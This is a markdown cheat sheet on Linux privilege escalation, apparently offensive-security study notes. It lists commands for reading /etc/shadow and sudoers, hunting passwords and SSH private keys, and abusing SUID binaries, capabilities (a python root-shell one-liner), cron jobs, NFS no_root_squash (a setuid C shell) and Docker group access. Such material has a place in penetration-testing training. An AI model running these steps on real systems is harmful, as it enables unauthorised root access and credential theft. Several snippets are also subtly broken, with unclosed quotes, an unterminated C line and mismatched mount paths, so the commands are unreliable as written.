# Linux privilege escalation

## Step 1 - Basic user enumeration

### System

What kernel is running? Are there exploits available? `uname -a`

What is the computer name? `hostname`

CPU details? `lscpu`

What services are running? `ps aux`

What is the path? `echo $PATH`

What software is installed?  `dpkg -l`

### User

Which user are you?

```text
Whoami
id
```

Any sudo privileges? 

```text
sudo -l
cat /etc/sudoers
```

Where are you in the filesystem? `pwd`

Who else is logged in? `who`

Can you view sensitive files? 

```text
cat /etc/passwd 
cat /etc/shadow 
cat /etc/group 
history
```

### Network

```text
ifconfig
route
arp -a
netstat -ano
```

### Passwords

Check `history` for recently used commands and passwords

Search the file system for passwords.  Try additional search terms \(pass, etc.\).

```text
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
```

### SSH keys

Search the filesystem for SSH keys.  Public keys are typically stored in the "authorized\_keys" folder, private keys are stored as "id\_rsa". If you find a private key, you can download and save the key in a file, then connect using:

```text
ssh -i filename username@ipaddress
```

#### Search terms

```text
find / -name id_rsa 2> /dev/null
find / -name authorized_keys 2> /dev/null
```

## Step 2 - Automated tools

```text
LinPeas.sh
LinEnum.sh
Linux Exploit Suggester
LinuxPrivChecker.py
```

## SUID Files

SUID files allow individuals to execute files using the privileges of another user.  They are identifiable by an "s" in the third character of the root permissions for a file.  You can search manually with:

```text
'find / -perm -u=s -type f 2>/dev/null'
```

If you find identify a SUID file, check [GTFO bins](https://gtfobins.github.io/) for exploits

## Capabilities

The exploitation for capabilities is similar to that of SUID files.  Search for capabilities with:

```text
getcap -r / 2>/dev/null
```

Look for "+ep" at the end of any returned items.  If present, exploitation possible.

### Execution

Run Python to escalate

```text
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")
```

Other possibly exploitable capabilities include perl, tar, openssl \(check [GTFO bins](https://gtfobins.github.io/)\)

## Scheduled Tasks

Most commonly known as cron jobs, but also includes systemd timers.  

View the crontab using `cat /etc/crontab`

Columns represent minute, hour, day of month, month, day of week

Asterisks in columns indicate "all", asterisks in all fields indicates that the task runs every minute/hour/day of month/month/day of week

Cron jobs run with the permissions of the process owner

View Systemd timers with `systemctl list-timers --all`

#### Exploitation

* Verify the file\(s\) referenced by the cron job exists
  * If not, create a file with the same filename
  * If so, attempt to modify the file\(s\) to execute code

## NFS root squashing

Check `cat /etc/exports` for results indicating "no\_root\_squash", indicating folders that are shareable and can be mounted. If available, remote commands are executed as root.

### Exploitation

From the attacking machine: 

Search for mountable shares 

```text
showmount -e ipaddress
```

Create a new directory:

```text
mkdir /tmp/mntme
```

 Mount the folder: 

```text
mount -o rw, vers=2 ipaddress:/tmp /tmp/mountme
```

Create malicious file:

```text
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; /tmp/mountme/x.c
```

Compile the file:

```text
gcc /tmp/mountme/x.c -o /tmp/mountme/x
```

Return to the victim machine, navigate to the target directory \(/tmp\), and execute the file

```text
./x
```

## Docker

If you are in the Docker group, check to see which containers are available:

```text
docker image ls
```

Run the image:

```text
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```



## 
